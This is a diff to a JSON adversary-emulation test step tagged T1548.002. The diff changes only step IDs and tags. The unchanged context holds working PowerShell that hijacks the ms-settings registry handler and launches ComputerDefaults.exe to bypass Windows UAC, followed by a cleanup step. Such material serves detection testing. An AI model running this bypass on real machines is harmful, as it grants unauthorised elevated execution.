@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "022ed057-c03d-4ac5-854b-27548dee7995",
+      "id": "755b6f91-8e20-4e37-bf17-3d0e82ec1b6d",
       "type": "execute-command",
       "data": {
         "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "14e175ab-77a8-41a7-9a8b-2296d9f9b221",
+      "id": "97f9b8f7-1787-4240-ae6a-8784dddecbf2",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n",
@@ -27,19 +27,19 @@
   ],
   "flows": [
     {
-      "s": "022ed057-c03d-4ac5-854b-27548dee7995",
+      "s": "755b6f91-8e20-4e37-bf17-3d0e82ec1b6d",
       "p": "on-success",
-      "o": "14e175ab-77a8-41a7-9a8b-2296d9f9b221"
+      "o": "97f9b8f7-1787-4240-ae6a-8784dddecbf2"
     },
     {
-      "s": "022ed057-c03d-4ac5-854b-27548dee7995",
+      "s": "755b6f91-8e20-4e37-bf17-3d0e82ec1b6d",
       "p": "on-failure",
-      "o": "14e175ab-77a8-41a7-9a8b-2296d9f9b221"
+      "o": "97f9b8f7-1787-4240-ae6a-8784dddecbf2"
     }
   ],
   "tags": [
-    "T1548.002",
-    "atomic-red-team"
+    "T1548",
+    "T1548.002"
   ],
   "input_arguments": [
     {
